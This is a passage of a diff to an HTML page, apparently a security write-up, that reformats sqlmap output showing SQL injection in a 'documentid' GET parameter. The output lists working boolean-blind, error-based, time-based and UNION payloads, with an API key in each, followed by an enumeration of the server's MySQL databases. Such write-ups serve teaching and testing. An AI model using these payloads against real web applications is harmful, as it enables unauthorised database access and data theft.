+<span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">vulnerable</span><span class="p">.</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">keep</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">others</span><span class="w"> </span><span class="p">(</span><span class="k">if</span><span class="w"> </span><span class="ow">any</span><span class="p">)</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">y/N</span><span class="o">]</span><span class="w"> </span><span class="n">N</span>
+<span class="n">sqlmap</span><span class="w"> </span><span class="n">identified</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="nl">requests</span><span class="p">:</span>
+<span class="o">---</span>
+<span class="k">Parameter</span><span class="err">:</span><span class="w"> </span><span class="n">documentid</span><span class="w"> </span><span class="p">(</span><span class="k">GET</span><span class="p">)</span>
+<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
+<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">HAVING</span><span class="w"> </span><span class="n">clause</span>
+<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">documentid</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="mi">7918</span><span class="o">=</span><span class="mi">7918</span><span class="o">&amp;</span><span class="n">apikey</span><span class="o">=</span><span class="n">WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</span>
 
-    Type: error-based
-    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
-    Payload: documentid=1 AND GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(4604=4604,1))),0x7162707071),4604)&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
+<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="n">error</span><span class="o">-</span><span class="n">based</span>
+<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">5.6</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="n">error</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">WHERE</span><span class="p">,</span><span class="w"> </span><span class="k">HAVING</span><span class="p">,</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">clause</span><span class="w"> </span><span class="p">(</span><span class="n">GTID_SUBSET</span><span class="p">)</span>
+<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">documentid</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="n">GTID_SUBSET</span><span class="p">(</span><span class="nf">CONCAT</span><span class="p">(</span><span class="mh">0x71706a6b71</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="p">(</span><span class="n">ELT</span><span class="p">(</span><span class="mi">4604</span><span class="o">=</span><span class="mi">4604</span><span class="p">,</span><span class="mi">1</span><span class="p">))),</span><span class="mh">0x7162707071</span><span class="p">),</span><span class="mi">4604</span><span class="p">)</span><span class="o">&amp;</span><span class="n">apikey</span><span class="o">=</span><span class="n">WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</span>
 
-    Type: time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: documentid=1 AND (SELECT 6105 FROM (SELECT(SLEEP(5)))RTBh)&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
+<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="nc">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
+<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">5.0.12</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="nc">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="p">(</span><span class="n">query</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">)</span>
+<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">documentid</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">6105</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">RTBh</span><span class="p">)</span><span class="o">&amp;</span><span class="n">apikey</span><span class="o">=</span><span class="n">WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</span>
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: documentid=-3837 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6b71,0x576f584150774e75475a74736661797967524668655955774d786776625962684a4d684371756b79,0x7162707071)-- -&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
----
-[18:31:27] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: Nginx 1.14.0
-back-end DBMS: MySQL &gt;= 5.6
-[18:31:30] [INFO] fetching database names
-available databases [5]:
-[*] information_schema
-[*] myfirstwebsite
-[*] mysql
-[*] performance_schema
-[*] sys
-</code></pre>
+<span class="w">    </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span>
+<span class="w">    </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Generic</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="k">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">columns</span>
+<span class="w">    </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">documentid</span><span class="o">=-</span><span class="mi">3837</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="ow">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="nf">CONCAT</span><span class="p">(</span><span class="mh">0x71706a6b71</span><span class="p">,</span><span class="mh">0x576f584150774e75475a74736661797967524668655955774d786776625962684a4d684371756b79</span><span class="p">,</span><span class="mh">0x7162707071</span><span class="p">)</span><span class="o">--</span><span class="w"> </span><span class="o">-&amp;</span><span class="n">apikey</span><span class="o">=</span><span class="n">WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</span>
+<span class="o">---</span>
+<span class="o">[</span><span class="n">18:31:27</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">MySQL</span>
+<span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">operating</span><span class="w"> </span><span class="k">system</span><span class="err">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">Ubuntu</span>
+<span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="nl">technology</span><span class="p">:</span><span class="w"> </span><span class="n">Nginx</span><span class="w"> </span><span class="mf">1.14.0</span>
+<span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="nl">DBMS</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">5.6</span>
+<span class="o">[</span><span class="n">18:31:30</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">names</span>
+<span class="n">available</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="o">[</span><span class="n">5</span><span class="o">]</span><span class="err">:</span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">information_schema</span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">myfirstwebsite</span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">mysql</span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">performance_schema</span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">sys</span>
+</code></pre></div>
         </div>
     </main>
 
